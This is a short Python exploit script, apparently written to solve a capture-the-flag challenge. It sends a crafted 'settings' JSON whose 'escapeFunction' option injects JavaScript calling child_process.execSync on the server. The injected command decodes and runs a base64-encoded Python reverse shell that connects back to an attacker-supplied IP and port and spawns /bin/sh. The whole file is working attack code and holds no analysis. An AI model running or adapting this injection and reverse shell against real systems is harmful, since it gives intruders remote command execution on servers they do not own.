import requests
import json
import base64

url = "<CHALLENGE_URL>"
LHOST = "<YOUR_PUBLIC_IP>"
LPORT = "<YOUR_PUBLIC_PORT>"

cmd = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import subprocess;subprocess.call(['/bin/sh','-i'])"
cmd = base64.b64encode(cmd.encode()).decode()

payload = {
    "client": True,
    "escapeFunction": f"(() => {{ process.mainModule.require('child_process').execSync(\"echo {cmd} | base64 -d | python3\"); return 'a'; }})"
}

params = {
    "username": "hacker",
    "settings": json.dumps(payload) 
}

print(f"[*] Sending payload to {url}...")
try:
    requests.get(url, params=params, timeout=2)
except requests.exceptions.Timeout:
    print("[+] Finished!")
except Exception as e:

    print(f"[-] Error: {e}")
